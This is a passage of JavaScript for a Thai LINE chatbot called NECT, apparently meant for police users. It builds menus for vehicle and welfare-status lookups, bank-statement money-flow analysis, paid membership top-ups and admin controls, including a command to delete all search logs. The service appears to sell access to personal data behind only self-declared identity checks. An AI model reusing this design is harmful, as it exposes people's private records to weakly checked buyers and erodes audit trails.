[9] บริการธุรกิจ
[10] บริการทัศนาจร
[11] บริการให้เช่า
[17] จักรยานยนต์สาธารณะ

งานขนส่งและรถโดยสาร
[30] รถโดยสารประจำทาง
[31] รถขนาดเล็ก
[32] โดยสารไม่ประจำทาง
[33] โดยสารส่วนบุคคล
[34] บรรทุกไม่ประจำทาง
[35] บรรทุกส่วนบุคคล

ลองส่ง: car@กรุงเทพ 1กก 334 1
────────────────`;
}

function buildWelfareMenuFlex() {
  return {
    type: 'flex',

    altText: "NECT · สรุปสิทธิสวัสดิการแห่งรัฐ",

    contents: {
      type: 'bubble',
      size: 'mega',

      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0F172A',
        paddingAll: '18px',

        contents: [
          {
            type: 'text',
            text: "สิทธิสวัสดิการของคุณ",
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg',
            wrap: true
          },

          {
            type: 'text',
            text: "NECT / WELFARE",
            color: '#94A3B8',
            size: 'xs',
            margin: 'sm'
          }
        ]
      },


      body: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '18px',
        spacing: 'md',

        contents: [
          {
            type: 'text',
            text: "ดูผลพิจารณาสวัสดิการแห่งรัฐ",
            weight: 'bold',
            size: 'md',
            color: '#111827',
            wrap: true
          },

          {
            type: 'text',
            text: "ติดตามผลการลงทะเบียนและการพิจารณาคุณสมบัติของคุณ",
            size: 'sm',
            color: '#64748B',
            wrap: true
          },

          {
            type: 'separator',
            margin: 'md'
          },

          {
            type: 'text',
            text: "เลือกปุ่มเพื่อไปยังหน้ารายละเอียดสิทธิสวัสดิการ",
            size: 'xs',
            color: '#94A3B8',
            margin: 'md',
            wrap: true
          }
        ]
      },


      footer: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '18px',

        contents: [
          {
            type: 'button',
            style: 'primary',
            height: 'sm',

            action: {
              type: 'uri',
              label: "เปิดหน้าสิทธิสวัสดิการ",
              uri: 'https://liff.line.me/2011072783-J1rW6GAz'
            }
          }
        ]
      }
    }
  };
}

function buildMoneyFlowMenuFlex() {
  return {
    type: 'flex',

    altText: "NECT · สำรวจรายการเงินด้วย Money Flow Link",

    contents: {
      type: 'bubble',
      size: 'mega',

      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0F172A',
        paddingAll: '18px',

        contents: [
          {
            type: 'text',
            text: "เส้นทางของรายการเงิน",
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg',
            wrap: true
          },

          {
            type: 'text',
            text: "NECT / MONEY FLOW LINK",
            color: '#94A3B8',
            size: 'xs',
            margin: 'sm'
          }
        ]
      },


      body: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '18px',
        spacing: 'md',

        contents: [
          {
            type: 'text',
            text: "ทำความเข้าใจการเคลื่อนไหวบัญชี",
            weight: 'bold',
            size: 'md',
            color: '#111827',
            wrap: true
          },

          {
            type: 'text',
            text:
              "นำไฟล์ Statement มาดูรายการรับ–จ่าย บัญชีคู่รายการ และความเชื่อมโยงของเส้นทางเงิน",
            size: 'sm',
            color: '#64748B',
            wrap: true
          },

          {
            type: 'separator',
            margin: 'md'
          },

          {
            type: 'box',
            layout: 'vertical',
            spacing: 'sm',
            margin: 'md',

            contents: [
              {
                type: 'text',
                text: "ภาพรวมยอดรับและยอดจ่าย",
                size: 'xs',
                color: '#475569',
                wrap: true
              },

              {
                type: 'text',
                text: "บัญชีคู่รายการพร้อมข้อมูลธนาคาร",
                size: 'xs',
                color: '#475569',
                wrap: true
              },

              {
                type: 'text',
                text: "เครือข่ายความเชื่อมโยงแบบ Link Network",
                size: 'xs',
                color: '#475569',
                wrap: true
              },

              {
                type: 'text',
                text: "รายการเงินเคลื่อนไหวเร็ว (Rapid Flow)",
                size: 'xs',
                color: '#475569',
                wrap: true
              }
            ]
          },

          {
            type: 'text',
            text:
              "เข้าใช้งานได้เฉพาะสมาชิกที่ผ่านอนุมัติและได้รับสิทธิ์แล้ว",
            size: 'xs',
            color: '#94A3B8',
            margin: 'md',
            wrap: true
          }
        ]
      },


      footer: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '18px',

        contents: [
          {
            type: 'button',
            style: 'primary',
            height: 'sm',

            action: {
              type: 'uri',
              label: "เปิดเครื่องมือ Money Flow Link",
              uri: 'https://memegabot.com/moneyflow'
            }
          }
        ]
      }
    }
  };
}

function buildRegisterGuideFlex() {
  return {
    type: 'flex',
    altText: 'วิธีสมัครสมาชิก',
    contents: {
      type: 'bubble',
      size: 'mega',
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          {
            type: 'text',
            text: 'ลงทะเบียนสมาชิก',
            size: 'xl',
            weight: 'bold',
            color: '#111827'
          },
          {
            type: 'text',
            text: 'กรุณาส่งข้อมูลตามรูปแบบด้านล่าง',
            size: 'sm',
            color: '#6B7280',
            wrap: true
          },
          {
            type: 'box',
            layout: 'vertical',
            backgroundColor: '#F3F4F6',
            cornerRadius: '12px',
            paddingAll: '12px',
            contents: [
              {
                type: 'text',
                text: 'regis%ยศ/ชื่อ-สกุล/ตำแหน่ง/สังกัด/เบอร์โทร',
                wrap: true,
                size: 'sm',
                color: '#111827'
              }
            ]
          },
          {
            type: 'text',
            text: 'ตัวอย่าง:\nregis%ร.ต.อ./สมชาย ใจดี/รอง สว.สส./สภ.เมือง/0812345678',
            wrap: true,
            size: 'sm',
            color: '#374151'
          },
          {
            type: 'text',
            text: 'หลังจากส่งข้อมูลแล้ว กรุณาส่งรูปบัตรหรือภาพหลักฐานต่อทันที',
            wrap: true,
            size: 'sm',
            color: '#DC2626'
          }
        ]
      }
    }
  };
}

function buildAdminMenuFlex() {
  return {
    type: 'flex',
    altText: 'เมนูแอดมิน',
    contents: {
      type: 'bubble',
      size: 'mega',
      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#7C2D12',
        paddingAll: '16px',
        contents: [
          {
            type: 'text',
            text: 'HADMIN MENU',
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg'
          },
          {
            type: 'text',
            text: 'คำสั่งสำหรับผู้ดูแลระบบ',
            color: '#FED7AA',
            size: 'sm',
            margin: 'sm'
          }
        ]
      },
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          menuSection(" จัดการสมาชิก", [
            'กดปุ่มเพื่อดูผลลัพธ์ได้ทันที'
          ]),
          menuSection(" จัดการ TOPUP", [
            'ดูรายการ TOPUP ที่รอตรวจสอบ'
          ]),
          menuSection(" คำสั่งค้นหาเพิ่มเติม", [
  'member#เบอร์โทร = ดูข้อมูลสมาชิก',
  'renew30#เบอร์โทร',
  'renew90#เบอร์โทร',
  'renew180#เบอร์โทร',
  'renew365#เบอร์โทร',
  'ดูlogค้นหา',
  'ดูlog#0812345678',
  'ลบlogทั้งหมด',
  'สมาชิกใกล้หมดอายุ',
  'ดูสมาชิกรอตรวจสอบ'
])
        ]
      },
      footer: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        contents: [
          {
  type: 'button',
  style: 'secondary',
  action: {
    type: 'postback',
    label: 'สมาชิกหมดอายุ',
    data: 'admin_members_expired',
    displayText: 'ดูสมาชิกหมดอายุ'
  }
},
{
  type: 'button',
  style: 'secondary',
  action: {
    type: 'message',
    label: 'สมาชิกใกล้หมดอายุ',
    text: 'สมาชิกใกล้หมดอายุ'
  }
},
{
  type: 'button',
  style: 'secondary',
  action: {
    type: 'message',
    label: 'ดู Log ค้นหา',
    text: 'ดูlog'
  }
},
{
  type: 'button',
  style: 'secondary',
  action: {
    type: 'message',
    label: 'ลบ Log ทั้งหมด',
    text: 'ลบlogทั้งหมด'
  }
},
{
  type: 'button',
  style: 'secondary',
  action: {
    type: 'postback',
    label: 'TOPUP รอตรวจสอบ',
    data: 'admin_topup_pending',
    displayText: 'ดู TOPUP รอตรวจสอบ'
  }
}
        ]
      }
    }
  };
}

function buildMemberStatusFlex(member, statusText) {
  const expireTime = member.expireAt
    ? new Date(member.expireAt).getTime()
    : 0;

  const remainDays = expireTime
    ? Math.max(
        0,
        Math.ceil((expireTime - Date.now()) / (24 * 60 * 60 * 1000))
      )
    : 0;

  let statusLabel = statusText || '-';
  let statusColor = '#16A34A';

  if (remainDays <= 0) {
    statusLabel = 'หมดอายุแล้ว';
    statusColor = '#DC2626';
  } else if (remainDays <= 5) {
    statusLabel = 'ใกล้หมดอายุ';
    statusColor = '#F59E0B';
  }

  return {
    type: 'flex',
    altText: 'สิทธิ์วันใช้งาน',
    contents: {
      type: 'bubble',
      size: 'mega',
      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0F172A',
        paddingAll: '16px',
        contents: [
          {
            type: 'text',
            text: " สิทธิ์วันใช้งาน",
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg'
          },
          {
            type: 'text',
            text: member.fullname || '-',
            color: '#CBD5E1',
            size: 'sm',
            margin: 'sm',
            wrap: true
          }
        ]
      },
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          infoLine(" ชื่อ", member.fullname || '-'),

          {
            type: 'box',
            layout: 'vertical',
            backgroundColor: statusColor,
            cornerRadius: '8px',
            paddingAll: '8px',
            contents: [
              {
                type: 'text',
                text: ` ${statusLabel}`,
                color: '#FFFFFF',
                weight: 'bold',
                align: 'center'
              }
            ]
          },

          infoLine(
            " วันคงเหลือ",
            `${remainDays} วัน`
          ),

          infoLine(
            " วันที่อนุมัติ",
            safeThaiDate(member.approvedAt)
          ),

          infoLine(
            " อายุการใช้งาน",
            `${member.approvedDays || 0} วัน`
          ),

          infoLine(
            '⚠️ วันหมดอายุ',
            safeThaiDate(member.expireAt)
          ),

          infoLine(
            " วันลงทะเบียน",
            safeThaiDate(
              member.registeredAt ||
              member.createdAt ||
              member.updatedAt
            )
          )
        ]
      },
      footer: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        contents: [
          {
            type: 'button',
            style: 'primary',
            color: '#2563EB',
            action: {
              type: 'message',
              label: 'ดูเมนูหลัก',
              text: 'menu%'
            }
          },
          {
            type: 'button',
            style: 'secondary',
            action: {
              type: 'message',
              label: 'ติดต่อแอดมิน',
              text: 'ติดต่อแอดมิน'
            }
          }
        ]
      }
    }
  };
}

function buildAdminApproveFlex(member, targetUserId) {
  return {
    type: 'flex',
    altText: 'มีผู้สมัครใหม่รออนุมัติ',
    contents: {
      type: 'bubble',
      size: 'giga',
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          {
            type: 'text',
            text: " ผู้สมัครใหม่",
            weight: 'bold',
            size: 'xl',
            color: '#111827'
          },
          infoLine('LINE', member.lineName || '-'),
          infoLine('UID', targetUserId),
          infoLine('ยศ', member.rank || '-'),
          infoLine('ชื่อ', member.fullname || '-'),
          infoLine('ตำแหน่ง', member.position || '-'),
          infoLine('สังกัด', member.department || '-'),
          infoLine('เบอร์โทร', member.phone || '-'),
          infoLine('เวลาสมัคร', member.registeredAt || '-'),
          {
            type: 'text',
            text: 'เลือกจำนวนวันที่ต้องการอนุมัติสมาชิก',
            wrap: true,
            size: 'sm',
            color: '#B45309'
          }
        ]
      },
      footer: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        contents: [
          {
            type: 'button',
            style: 'primary',
            color: '#16A34A',
            action: {
              type: 'postback',
              label: 'อนุมัติ 30 วัน',
              data: `approve_days|${targetUserId}|30`,
              displayText: `อนุมัติ 30 วัน ${member.fullname || targetUserId}`
            }
          },
          {
            type: 'button',
            style: 'primary',
            color: '#15803D',
            action: {
              type: 'postback',
              label: 'อนุมัติ 90 วัน',
              data: `approve_days|${targetUserId}|90`,
              displayText: `อนุมัติ 90 วัน ${member.fullname || targetUserId}`
            }
          },
          {
            type: 'button',
            style: 'primary',
            color: '#0F766E',
            action: {
              type: 'postback',
              label: 'อนุมัติ 180 วัน',
              data: `approve_days|${targetUserId}|180`,
              displayText: `อนุมัติ 180 วัน ${member.fullname || targetUserId}`
            }
          },
          {
            type: 'button',
            style: 'primary',
            color: '#1D4ED8',
            action: {
              type: 'postback',
              label: 'อนุมัติ 365 วัน',
              data: `approve_days|${targetUserId}|365`,
              displayText: `อนุมัติ 365 วัน ${member.fullname || targetUserId}`
            }
          },
          {
            type: 'button',
            style: 'secondary',
            action: {
              type: 'postback',
              label: 'ปฏิเสธ',
              data: `reject|${targetUserId}`,
              displayText: `ปฏิเสธ ${member.fullname || targetUserId}`
            }
          }
        ]
      }
    }
  };
}

function buildMemberManageFlex(member, targetUserId) {
  const expiredText = member.expireAt
    ? formatThaiDate(member.expireAt)
    : '-';

  const statusText =
    member.status === 'approved'
      ? (isExpired(member.expireAt) ? 'หมดอายุแล้ว' : 'อนุมัติแล้ว')
      : member.status === 'waiting_card'
        ? 'รอส่งรูปหลักฐาน'
        : member.status === 'pending'
          ? 'รอตรวจสอบ'
          : member.status === 'rejected'
            ? 'ถูกปฏิเสธ'
            : member.status || '-';

  return {
    type: 'flex',
    altText: 'จัดการสมาชิก',
    contents: {
      type: 'bubble',
      size: 'giga',
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          {
            type: 'text',
            text: " จัดการสมาชิก",
            weight: 'bold',
            size: 'xl',
            color: '#111827'
          },
          infoLine('ชื่อ', member.fullname || '-'),
          infoLine('LINE', member.lineName || '-'),
          infoLine('UID', targetUserId),
          infoLine('เบอร์', member.phone || '-'),
          infoLine('สถานะ', statusText),
          infoLine('อายุล่าสุด', member.approvedDays || 0),
          infoLine('หมดอายุ', expiredText),
          infoLine('ต่ออายุแล้ว', member.renewCount || 0)
        ]
      },
      footer: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        contents: [
          {
            type: 'button',
            style: 'primary',
            color: '#16A34A',
            action: {
              type: 'postback',
              label: 'ต่ออายุ 30 วัน',
              data: `renew_days|${targetUserId}|30`,
              displayText: `ต่ออายุ 30 วัน ${member.fullname || targetUserId}`
            }
          },
          {
            type: 'button',
            style: 'primary',
            color: '#15803D',
            action: {
              type: 'postback',
              label: 'ต่ออายุ 90 วัน',
              data: `renew_days|${targetUserId}|90`,
              displayText: `ต่ออายุ 90 วัน ${member.fullname || targetUserId}`
            }
          },
          {
            type: 'button',
            style: 'primary',
            color: '#0F766E',
            action: {
              type: 'postback',
              label: 'ต่ออายุ 180 วัน',
              data: `renew_days|${targetUserId}|180`,
              displayText: `ต่ออายุ 180 วัน ${member.fullname || targetUserId}`
            }
          },
          {
            type: 'button',
            style: 'primary',
            color: '#1D4ED8',
            action: {
              type: 'postback',
              label: 'ต่ออายุ 365 วัน',
              data: `renew_days|${targetUserId}|365`,
              displayText: `ต่ออายุ 365 วัน ${member.fullname || targetUserId}`
            }
          }
        ]
      }
    }
  };
}

function buildTopupFlex() {
  return {
    type: 'flex',
    altText: 'TOPUP / แจ้งโอน',
    contents: {
      type: 'bubble',
      size: 'mega',
      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0F172A',
        paddingAll: '16px',
        contents: [
          {
            type: 'text',
            text: 'TOPUP / แจ้งโอน',
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg'
          },
          {
            type: 'text',
            text: 'ส่งสลิปเพื่อให้แอดมินตรวจสอบ',
            color: '#CBD5E1',
            size: 'sm',
            margin: 'sm'
          }
        ]
      },
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          menuSection(" แพ็กเกจที่รองรับ", [
            "• ╾ 30 วัน",
            "• ╾ 90 วัน",
            "• ╾ 180 วัน",
            "• ╾ 365 วัน"
          ]),
          menuSection(" วิธีแจ้งโอน", [
            '1) พิมพ์: topup30 หรือ topup90',
            '2) หรือ topup180 / topup365',
            '3) จากนั้นส่งสลิปเข้ามาในแชตนี้'
          ]),
          {
            type: 'text',
            text: 'หลังจากผู้ดูแลตรวจสอบแล้ว จะเป็นผู้กำหนดวันอนุมัติให้เอง',
            wrap: true,
            size: 'sm',
            color: '#B45309'
          }
        ]
      },
      footer: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        contents: [
          {
            type: 'button',
            style: 'primary',
            color: '#2563EB',
            action: {
              type: 'message',
              label: 'เลือก 30 วัน',
              text: 'topup30'
            }
          },
          {
            type: 'button',
            style: 'secondary',
            action: {
              type: 'message',
              label: 'เลือก 90 วัน',
              text: 'topup90'
            }
          },
          {
            type: 'button',
            style: 'secondary',
            action: {
              type: 'message',
              label: 'เลือก 180 วัน',
              text: 'topup180'
            }
          },
          {
            type: 'button',
            style: 'secondary',
            action: {
              type: 'message',
              label: 'เลือก 365 วัน',
              text: 'topup365'
            }
          }
        ]
      }
    }
  };
}

function buildTopupAdminFlex(topup, userId) {
  return {
    type: 'flex',
    altText: 'มีรายการ TOPUP ใหม่',
    contents: {
      type: 'bubble',
      size: 'giga',
      body: {
        type: 'box',
        layout: 'vertical',
        spacing: 'md',
        contents: [
          {
            type: 'text',
            text: " รายการ TOPUP ใหม่",
            weight: 'bold',
            size: 'xl',
            color: '#111827'
          },
          infoLine('ชื่อ', topup.fullname || topup.lineName || '-'),
          infoLine('LINE', topup.lineName || '-'),
          infoLine('UID', userId),
          infoLine('เบอร์', topup.phone || '-'),
          infoLine('แพ็กเกจ', topup.packageLabel || '-'),
          infoLine('เวลาแจ้ง', topup.updatedAt || '-'),
          {
            type: 'text',
            text: 'แอดมินตรวจสอบสลิปแล้วค่อยกำหนดวันอนุมัติเอง',
            wrap: true,
            size: 'sm',
            color: '#B45309'
          }
        ]
      },
      footer: {
        type: 'box',
        layout: 'vertical',
        spacing: 'sm',
        contents: [
          {
            type: 'button',
            style: 'primary',
            color: '#16A34A',
            action: {
              type: 'postback',
              label: 'อนุมัติ TOPUP แล้ว',
              data: `topup_approved|${userId}`,
              displayText: `อนุมัติ TOPUP ${topup.fullname || userId}`
            }
          },
          {
            type: 'button',
            style: 'secondary',
            action: {
              type: 'postback',
              label: 'ปฏิเสธ TOPUP',
              data: `topup_rejected|${userId}`,
              displayText: `ปฏิเสธ TOPUP ${topup.fullname || userId}`
            }
          }
        ]
      }
    }
  };
}

function buildContactAdminFlex() {
  return {
    type: 'flex',
    altText: 'ติดต่อแอดมิน',
    contents: {
      type: 'bubble',
      size: 'mega',
      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0F172A',
        paddingAll: '16px',
        contents: [
          {
            type: 'text',
            text: " ติดต่อแอดมิน",
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg'
          }
        ]
      },
      body: {
        type: 'box',
        layout: 'vertical',
        contents: [
          {
            type: 'text',
            text: 'สอบถามแอดมินแจ้งข้อความได้เลยครับ',
            wrap: true,
            size: 'md',
            color: '#111827'
          }
        ]
      },
      footer: {
  type: 'box',
  layout: 'vertical',
  spacing: 'sm',
  contents: [
    {
      type: 'button',
      style: 'primary',
      color: '#2563EB',
      action: {
        type: 'message',
        label: " ดูเมนูคำสั่ง",
        text: 'menu%'
      }
    },
    {
      type: 'button',
      style: 'primary',
      color: '#22C55E',
      action: {
        type: 'uri',
        label: " ติดต่อ ADMIN",
        uri: 'https://line.me/ti/p/mVmD-ncfvU'
            }
          }
        ]
      }
    }
  };
}

function mapTopupPackage(text) {
  const cmd = text.toLowerCase().trim();
  if (cmd === 'topup30') return { days: 30, label: '30 วัน' };
  if (cmd === 'topup90') return { days: 90, label: '90 วัน' };
  if (cmd === 'topup180') return { days: 180, label: '180 วัน' };
  if (cmd === 'topup365') return { days: 365, label: '365 วัน' };
  return null;
}

function buildMembersAllText(db, page = 1) {
  const allMembers = Object.entries(db.members);
  if (!allMembers.length) return 'ยังไม่มีสมาชิกในระบบ';

  const perPage = 50;
  const totalPages = Math.ceil(allMembers.length / perPage);
  const currentPage = Math.max(1, Math.min(Number(page) || 1, totalPages));

  const start = (currentPage - 1) * perPage;
  const lines = allMembers.slice(start, start + perPage).map(([uid, m], i) => {
    const statusText =
      m.status === 'approved'
        ? (isExpired(m.expireAt) ? 'หมดอายุ' : 'อนุมัติ')
        : m.status === 'waiting_card'
        ? 'รอสรุป'
        : m.status === 'pending'
        ? 'รอตรวจสอบ'
        : m.status === 'rejected'
        ? 'ปฏิเสธ'
        : m.status || '-';

    return `${start + i + 1}. ${m.fullname || '-'} | ${m.phone || '-'} | ${statusText}`;
  });

  return `สมาชิกทั้งหมด (${allMembers.length}) หน้า ${currentPage}/${totalPages}\n\n${lines.join('\n')}\n\nดูหน้าถัดไป กดพิมพ์: ดูสมาชิกทั้งหมด ${currentPage + 1}`;
}

function buildMembersExpiredText(db) {
  const expired = Object.entries(db.members).filter(([_, m]) =>
    m.status === 'approved' && isExpired(m.expireAt)
  );

  if (!expired.length) return 'ยังไม่มีสมาชิกที่หมดอายุ';

  const lines = expired.slice(0, 50).map(([uid, m], i) =>
    `${i + 1}. ${m.fullname || '-'} | ${m.phone || '-'} | หมดอายุ: ${m.expireAt ? formatThaiDate(m.expireAt) : '-'}`
  );

  return `สมาชิกหมดอายุ (${expired.length})\n\n${lines.join('\n')}`;
}

function buildMembersExpiringSoonText(db, page = 1) {
  const now = Date.now();
  const maxDays = 3;
  const perPage = 50;

  const members = Object.entries(db.members || {})
    .filter(([uid, m]) => {
      if (m.status !== 'approved') return false;
      if (!m.expireAt) return false;

      const expireTime = new Date(m.expireAt).getTime();
      if (Number.isNaN(expireTime)) return false;

      const remainDays = Math.ceil((expireTime - now) / (24 * 60 * 60 * 1000));

      return remainDays >= 0 && remainDays <= maxDays;
    })
    .map(([uid, m]) => {
      const expireTime = new Date(m.expireAt).getTime();
      const remainDays = Math.ceil((expireTime - now) / (24 * 60 * 60 * 1000));

      return { uid, ...m, remainDays };
    })
    .sort((a, b) => a.remainDays - b.remainDays);

  if (!members.length) {
    return 'ไม่มีสมาชิกใกล้หมดอายุใน 3 วัน';
  }

  const totalPages = Math.ceil(members.length / perPage);
  const currentPage = Math.max(1, Math.min(Number(page) || 1, totalPages));
  const start = (currentPage - 1) * perPage;

  const lines = members.slice(start, start + perPage).map((m, i) =>
    `${start + i + 1}. ${m.fullname || '-'} | ${m.phone || '-'} | เหลือ ${m.remainDays} วัน | หมดอายุ: ${formatThaiDate(m.expireAt)}`
  );

  const nextText = currentPage < totalPages
    ? `\n\nดูหน้าถัดไป: สมาชิกใกล้หมดอายุ ${currentPage + 1}`
    : '\n\nจบรายการแล้ว';

  return limitLineMessage(
    `สมาชิกใกล้หมดอายุใน 3 วัน (${members.length}) หน้า ${currentPage}/${totalPages}\n\n${lines.join('\n')}${nextText}`
  );
}

function buildPendingMembersText(db, page = 1) {

  const members = Object.entries(db.members || {})
    .filter(([_, m]) => m.status === 'pending');

  const perPage = 20;
  const start = (page - 1) * perPage;

  const pageMembers = members.slice(
    start,
    start + perPage
  );

  if (!pageMembers.length) {
    return '❌ ไม่พบสมาชิกรอตรวจสอบ';
  }

  let msg =
` สมาชิกรอตรวจสอบ
หน้า ${page}

`;

  pageMembers.forEach(([uid, m], i) => {

    msg +=
`${start + i + 1}. ${m.fullname || '-'}
 ${m.phone || '-'}
 ${m.registeredAt || '-'}
 ${uid}

`;
  });

  const totalPages =
    Math.ceil(members.length / perPage);

  msg +=
`\nทั้งหมด ${members.length} คน
หน้า ${page}/${totalPages}`;

  return msg;
}

function getRemainDays(expireAt) {
  if (!expireAt) return null;

  const expireTime = new Date(expireAt).getTime();
  if (Number.isNaN(expireTime)) return null;

  return Math.ceil((expireTime - Date.now()) / (24 * 60 * 60 * 1000));
}

async function notifyMemberExpiryAlerts() {
  const db = loadDB();
  let changed = false;

  for (const [userId, member] of Object.entries(db.members || {})) {
    if (member.status !== 'approved') continue;
    if (!member.expireAt) continue;

    const remainDays = getRemainDays(member.expireAt);
    if (remainDays === null) continue;

    try {
      if (remainDays === 3 && !member.notifyExpire3Day) {
        await push(userId, {
          type: 'text',
          text:
` สิทธิ์ใช้งานของท่านจะหมดอายุในอีก 3 วัน

กรุณาติดต่อแอดมินเพื่อต่ออายุสมาชิก
เพื่อรักษาสิทธิ์ของท่าน `
        });

        member.notifyExpire3Day = true;
        changed = true;
      }

      if (remainDays === 1 && !member.notifyExpire1Day) {
        await push(userId, {
          type: 'text',
          text:
`⚠️ สิทธิ์ใช้งานของท่านจะหมดอายุภายใน 24 ชั่วโมง

กรุณาติดต่อแอดมินเพื่อต่ออายุสมาชิก
เพื่อไม่ให้การใช้งานสะดุด `
        });

        member.notifyExpire1Day = true;
        changed = true;
      }

      if (remainDays <= 0 && !member.expiredNotified) {
        await push(userId, {
          type: 'text',
          text:
` วันใช้งานของท่านหมดอายุแล้ว 

ติดต่อแอดมินเพื่อทำการต่ออายุใช้งาน

เพื่อรักษาสิทธิ์ของท่าน `
        });

        member.expiredNotified = true;
        changed = true;
      }

    } catch (e) {
      console.log('expiry notify error:', userId, e.message);
    }
  }

  if (changed) saveDB(db);
}

function buildMembersPendingText(db) {
  const pending = Object.entries(db.members).filter(([_, m]) => m.status === 'pending');

  if (!pending.length) return 'ไม่มีสมาชิกที่รอตรวจสอบ';

  const lines = pending.slice(0, 50).map(([uid, m], i) =>
    `${i + 1}. ${m.fullname || '-'} | ${m.phone || '-'} | สมัครเมื่อ: ${m.registeredAt || '-'}`
  );

  return `สมาชิกที่รอตรวจสอบ (${pending.length})\n\n${lines.join('\n')}`;
}

function buildTopupPendingText(db) {
  const pendingTopups = Object.entries(db.topups || {}).filter(([_, t]) =>
    t.status === 'pending_review'
  );

  if (!pendingTopups.length) return 'ไม่มีรายการ TOPUP ที่รอตรวจสอบ';

  const lines = pendingTopups.slice(0, 50).map(([uid, t], i) =>
    `${i + 1}. ${t.fullname || t.lineName || '-'} | ${t.phone || '-'} | ${t.packageLabel || '-'} | ${t.updatedAt || '-'}`
  );

  return `รายการ TOPUP รอตรวจสอบ (${pendingTopups.length})\n\n${lines.join('\n')}`;
}

async function notifyAdmins(messages) {
  for (const adminId of ADMIN_IDS) {
    try {
      await push(adminId, messages);
    } catch (e) {
      console.error(`notify admin error (${adminId}):`, e?.response?.data || e.message);
    }
  }
}

function canUseBotCommands(userId, member, text) {
  // แอดมินใช้ได้ทุกคำสั่ง
  if (isAdmin(userId)) return true;

  // คำสั่งที่คนยังไม่อนุมัติใช้ได้
  const publicCommands = [
    'ยินยอมรับข้อตกลง',
    'สถานะการสมัคร',
    'myid',
    'ติดต่อแอดมิน'
  ];

  if (publicCommands.includes(text)) return true;
  if (text.startsWith('regis%')) return true;

  // คำสั่งอื่นทั้งหมด ต้องเป็นสมาชิก approved และไม่หมดอายุ
  return isActiveMember(member);
}

function buildWelcomeWarningFlex() {
  return {
    type: 'flex',
    altText: 'ข้อควรปฏิบัติและคำเตือนสำคัญ',
    contents: {
      type: 'bubble',
      size: 'mega',

      body: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0B0F14',
        paddingAll: '18px',
        spacing: 'md',

        contents: [

          {
            type: 'text',
            text: '⚠️ ข้อควรปฏิบัติและคำเตือนสำคัญ ⚠️',
            weight: 'bold',
            size: 'lg',
            color: '#FFCC00',
            wrap: true,
            align: 'center'
          },

          {
            type: 'separator',
            color: '#334155'
          },

          // =========================
          // ข้อ 1
          // =========================
          {
            type: 'text',
            text: "1. สิทธิ์การเข้าถึง",
            weight: 'bold',
            color: '#FFFFFF',
            size: 'sm'
          },

          {
            type: 'text',
            text: 'อนุญาตเฉพาะเจ้าหน้าที่ตำรวจที่ปฏิบัติหน้าที่เท่านั้น',
            color: '#CBD5E1',
            size: 'sm',
            wrap: true
          },


          // =========================
          // ข้อ 2
          // =========================
          {
            type: 'text',
            text: "2. วัตถุประสงค์",
            weight: 'bold',
            color: '#FFFFFF',
            size: 'sm',
            margin: 'md'
          },

          {
            type: 'text',
            text: 'ข้อมูลนี้มีไว้เพื่อสนับสนุนงานด้านการสืบสวนสอบสวนโดยเฉพาะ',
            color: '#CBD5E1',
            size: 'sm',
            wrap: true
          },


          // =========================
          // ข้อ 3
          // =========================
          {
            type: 'text',
            text: "3. ข้อเคร่งครัด",
            weight: 'bold',
            color: '#FFFFFF',
            size: 'sm',
            margin: 'md'
          },

          {
            type: 'text',
            text: 'ห้ามคัดลอก เผยแพร่ หรือส่งต่อข้อมูลสู่ภายนอกโดยเด็ดขาด หากฝ่าฝืน ทำการตัดสิทธิ์ในทันที',
            color: '#FCA5A5',
            size: 'sm',
            wrap: true
          },


          // =========================
          // ข้อ 4
          // =========================
          {
            type: 'text',
            text: "4. การยืนยันตัวตน",
            weight: 'bold',
            color: '#FFFFFF',
            size: 'sm',
            margin: 'md'
          },

          {
            type: 'text',
            text:
              'เจ้าหน้าที่ท่านใดที่ต้องการใช้งาน ให้แจ้งข้อมูลโดยความเป็นจริง\n' +
              'ห้ามแอบอ้างผู้อื่น หรือแจ้งข้อมูลเท็จ หากตรวจพบจะถูกระงับและนำออกจากระบบทันที',
            color: '#CBD5E1',
            size: 'sm',
            wrap: true
          },


          // =========================
          // ข้อ 5
          // =========================
          {
            type: 'text',
            text: "5. สำคัญ",
            weight: 'bold',
            color: '#FFCC00',
            size: 'sm',
            margin: 'md'
          },

          {
            type: 'text',
            text:
              'ท่านที่สมัครใหม่ ต้องมีผู้แนะนำเท่านั้น และผู้แนะนำต้องเป็นสมาชิกปัจจุบัน ✅',
            color: '#FDE68A',
            size: 'sm',
            wrap: true
          },

          {
            type: 'separator',
            color: '#334155',
            margin: 'md'
          },

          {
            type: 'text',
            text:
              'หากท่านอ่านครบแล้วและต้องการสมัคร กรุณากดปุ่ม “รับทราบกฏของระบบ” ด้านล่าง',
            color: '#FFFFFF',
            size: 'sm',
            weight: 'bold',
            wrap: true,
            align: 'center',
            margin: 'md'
          }

        ]
      },


      // =========================
      // FOOTER
      // =========================
      footer: {
        type: 'box',
